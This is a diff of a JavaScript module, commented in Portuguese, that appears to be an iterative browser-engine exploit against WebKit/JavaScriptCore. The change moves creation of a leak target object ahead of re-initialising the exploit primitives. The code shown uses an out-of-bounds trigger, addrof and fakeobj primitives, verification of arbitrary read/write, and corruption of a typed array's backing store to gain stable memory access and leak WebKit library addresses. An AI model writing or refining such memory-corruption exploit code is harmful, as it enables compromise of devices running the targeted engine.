@@ -1,11 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v120 - R80 Remover Re-trigger OOB em Fase 5)
+// js/script3/testArrayBufferVictimCrash.mjs (v121 - R81 Criar leak_target_obj antes do Reset da Primitiva)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Remover a chamada a 'triggerOOB_primitive({ force_reinit: true })' antes da Fase 5.
-// - Apenas re-inicializar as variáveis 'confused_array', 'victim_array' e re-definir
-//   as funções addrof/fakeobj para a Fase 5.
-// - Isso deve evitar que o ambiente OOB global seja resetado novamente, na esperança
-//   de manter o 'addrof_func' estável após a Fase 4.
+// - O objeto alvo para o vazamento (leak_target_obj) será criado ANTES da re-inicialização
+//   das primitivas na Fase 5, na esperança de que seu endereço seja mantido estável
+//   no heap e a addrof_func recém-inicializada consiga recuperá-lo.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -19,7 +17,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v120_R80_NoOOBReTrigger";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v121_R81_ObjBeforeReset";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -43,7 +41,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação sem Re-trigger OOB na Fase 5 ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Objeto Alvo Criado Antes do Reset ---`, "test");
 
     let final_result = {
         success: false,
@@ -65,11 +63,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     let arb_write_stable = null;
 
     // Variáveis com escopo ajustado para serem acessíveis em toda a função
+    // leak_target_obj e leak_target_addr serão declarados e inicializados MAIS CEDO
     let leak_target_obj = null;
     let leak_target_addr = null;
 
     try {
-        // Helper para definir as primitivas de addrof/fakeobj (para obtenção de endereços)
+        // Helper para definir as primitivas. Será chamado 2 vezes (Fase 4 e Fase 5)
         const setupAddrofFakeobj = () => {
             confused_array = [13.37]; 
             victim_array = [{ dummy: 0 }]; 
@@ -87,7 +86,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         // --- FASES 1-3: Configuração das Primitivas INICIAL (para verificação) ---
         logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E (primeira vez para verificação)... ---", "subtest");
-        // O trigger OOB inicial permanece.
         await triggerOOB_primitive({ force_reinit: true }); 
         if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
 
@@ -134,6 +132,14 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("VERIFICAÇÃO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
         await PAUSE_S3(50); 
 
+        // ============================================================================
+        // NOVO: CRIAR leak_target_obj AQUI, ANTES DO RESET DAS PRIMITIVAS
+        // ============================================================================
+        leak_target_obj = { f: 0xDEADBEEF, g: 0xCAFEBABE, h: 0x11223344 }; 
+        for(let i=0; i<1000; i++) { leak_target_obj[`p${i}`] = i; } // Para otimizar o tipo
+        logS3(`[PRE-FASE 5] Objeto alvo (leak_target_obj) criado. Propagado para ser usado após o reset das primitivas.`, "info");
+        await PAUSE_S3(50); // Pequena pausa para garantir que o objeto esteja no heap
+
         // --- PREPARANDO FASE 5: APENAS RE-INICIALIZANDO PRIMITIVAS (SEM RE-TRIGGER OOB) ---
         logS3("--- PREPARANDO FASE 5: APENAS RE-INICIALIZANDO PRIMITIVAS (SEM RE-TRIGGER OOB) ---", "critical");
         
@@ -147,8 +153,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         await PAUSE_S3(200); 
 
-        // REMOVIDO: await triggerOOB_primitive({ force_reinit: true });
-        // if (!getOOBDataView()) throw new Error("Falha ao re-inicializar primitiva OOB para Fase 5.");
         logS3("Ambiente OOB existente será reutilizado. Primitivas serão re-definidas.", "good");
 
         setupAddrofFakeobj(); // Re-cria as primitivas addrof/fakeobj no contexto EXISTENTE
@@ -163,18 +167,16 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await PAUSE_S3(50); 
 
         // ============================================================================
-        // NOVO: CONSTRUÇÃO DA PRIMITIVA DE LEITURA/ESCRITA ARBITRÁRIA ESTÁVEL (CORRUPÇÃO DE BACKING STORE)
+        // CONSTRUÇÃO DA PRIMITIVA DE LEITURA/ESCRITA ARBITRÁRIA ESTÁVEL (CORRUPÇÃO DE BACKING STORE)
         // ============================================================================
         logS3("--- FASE 5.1: Construindo Primitiva de L/E Estável (Corrupção de Backing Store) ---", "subtest");
 
         arb_rw_array = new Uint8Array(0x1000); 
         logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");
 
-        // Agora, 'leak_target_obj' e 'leak_target_addr' são inicializados aqui, após a re-inicialização das primitivas.
-        leak_target_obj = { f: 0xDEADBEEF, g: 0xCAFEBABE, h: 0x11223344 }; 
-        for(let i=0; i<1000; i++) { leak_target_obj[`p${i}`] = i; } 
-        leak_target_addr = addrof_func(leak_target_obj); // Atribui à variável de escopo mais amplo
-        logS3(`[Etapa 1] Endereço do objeto alvo (leak_target_obj): ${leak_target_addr.toString(true)}`, "info");
+        // Agora, obter o endereço do leak_target_obj existente
+        leak_target_addr = addrof_func(leak_target_obj); 
+        logS3(`[Etapa 1] Endereço do objeto alvo (leak_target_obj) obtido APÓS reset da primitiva: ${leak_target_addr.toString(true)}`, "info");
         
         await PAUSE_S3(250); 
 
@@ -361,8 +363,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         arb_rw_array = null; 
         arb_read_stable = null;
         arb_write_stable = null;
-        leak_target_obj = null; // Limpar também
-        leak_target_addr = null; // Limpar também
+        leak_target_obj = null; 
+        leak_target_addr = null; 
         
         logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
     }
